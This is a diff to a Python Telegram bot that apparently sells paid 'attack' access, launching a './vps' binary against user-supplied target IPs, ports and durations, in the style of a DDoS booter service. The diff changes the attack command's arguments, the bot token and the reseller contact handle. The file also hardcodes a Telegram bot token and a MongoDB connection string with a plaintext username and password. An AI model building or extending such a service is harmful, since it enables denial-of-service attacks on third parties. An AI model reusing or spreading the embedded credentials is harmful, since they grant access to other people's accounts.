@@ -13,7 +13,7 @@ from threading import Thread
 
 loop = asyncio.get_event_loop()
 
-TOKEN = '7994610793:AAE_geiZ8e_ebXrS6NuRSR5HBSOUhpJS2gU'
+TOKEN = '7930436040:AAE3gos6JqF2-Skx4zkXIHDDVmx0WNP_U2I'
 MONGO_URI = 'mongodb+srv://VIKASH:BadnamBadshah@cluster0.jv9he.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0&tlsAllowInvalidCertificates=true'
 FORWARD_CHANNEL_ID = -1002676186958
 CHANNEL_ID = -1002676186958
@@ -35,7 +35,7 @@ running_processes = []
 
 REMOTE_HOST = '4.213.71.147'  
 async def run_attack_command_on_codespace(target_ip, target_port, duration):
-    command = f"./vps {target_ip} {target_port} {duration}"
+    command = f"./vps {target_ip} {target_port} {duration} 900"
     try:
        
         process = await asyncio.create_subprocess_shell(
@@ -79,7 +79,7 @@ def check_user_approval(user_id):
     return False
 
 def send_not_approved_message(chat_id):
-    bot.send_message(chat_id, "*YOU ARE NOT APPROVED BUY ACCESS:-@RAHUL_MODS_OWNER*", parse_mode='Markdown')
+    bot.send_message(chat_id, "*YOU ARE NOT APPROVED BUY ACCESS:-@LEGEND9399x*", parse_mode='Markdown')
 
 @bot.message_handler(commands=['approve', 'disapprove'])
 def approve_or_disapprove_user(message):
@@ -252,7 +252,7 @@ def handle_message(message):
         bot.reply_to(message, "*🚀Attack Selected*", parse_mode='Markdown')
         attack_command(message)
     elif message.text == "💼ResellerShip":
-        bot.send_message(message.chat.id, "*FOR RESSELER SHIP DM :-@RAHUL_MODS_OWNER*", parse_mode='Markdown')
+        bot.send_message(message.chat.id, "*FOR RESSELER SHIP DM :-@LEGEND9399x*", parse_mode='Markdown')
     elif message.text == "ℹ️ My Info":
         user_id = message.from_user.id
         user_data = users_collection.find_one({"user_id": user_id})
